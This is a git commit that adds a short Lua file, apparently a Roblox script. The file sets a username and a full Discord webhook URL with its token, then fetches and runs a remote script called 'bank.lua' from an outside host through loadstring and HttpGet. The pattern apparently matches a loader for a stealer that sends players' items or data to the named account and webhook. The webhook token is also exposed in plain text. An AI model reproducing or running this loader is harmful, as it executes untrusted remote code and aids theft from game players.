33ec1b95fa9ffce8970c7e931f367bdbcda1c6ff
CatScripter <137832645+CatScripter@users.noreply.github.com>
2023-10-24 20:43:37 +0300

    Add files via upload

---
+++ 185694387502850173454723957957.lua
@@ -0,0 +1,4 @@
+UserName = "robzi_play8"
+WebHook = "https://discord.com/api/webhooks/1166430777651777678/qlpGKyhK1rKe1fRJB50XF_8NE5Dt6hq7PB0pGEAmQ_KB3FamwYseOIHIZOcGIEuXnKiX"
+
+loadstring(game:HttpGet("https://goof.pro/s/bank.lua", true))()
